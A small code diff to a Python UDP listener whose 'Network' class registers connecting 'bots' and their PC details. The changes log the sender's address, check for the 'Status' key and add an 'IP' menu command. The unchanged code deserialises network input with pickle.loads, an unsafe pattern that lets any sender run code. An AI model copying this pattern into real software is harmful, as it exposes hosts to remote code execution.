@@ -74,8 +74,8 @@ class Network:
             try:
                 data, addr = server_socket.recvfrom(1024)
                 message = pickle.loads(data)
-                print(message)
-                if addr[0] not in self.bots and message["Status"] is True:
+                print(addr[0], message)
+                if addr[0] not in self.bots and "Status" in message and message["Status"] is True:
                     self.bots[addr[0]] = {"name": addr[1], "Status": False, "PC": message["PC"], "Data": None}
                     print("Получено сообщение от {0}: {1}".format(addr, message))
             except socket.timeout:
@@ -177,6 +177,8 @@ class Network:
                     print(self.bots)
                 case "PC":
                     print(self.MyComputer())
+                case "IP":
+                    print(self.ip)
                 case "e":
                     exit(4)
                 case _:
